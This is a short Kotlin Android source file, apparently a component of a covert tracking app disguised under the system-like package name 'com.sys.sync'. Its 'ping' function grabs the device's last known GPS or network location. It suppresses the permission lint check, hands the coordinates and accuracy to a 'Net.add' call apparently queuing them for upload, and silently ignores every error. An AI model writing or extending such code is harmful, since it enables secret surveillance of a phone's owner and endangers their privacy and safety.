package com.sys.sync

import android.annotation.SuppressLint
import android.content.Context
import android.location.LocationManager

object Loc {
    @SuppressLint("MissingPermission")
    fun ping(c: Context) {
        try {
            val lm = c.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) ?: return
            Net.add("loc", "${loc.latitude},${loc.longitude}", null, loc.accuracy.toString())
        } catch (_: Exception) {}
    }
}
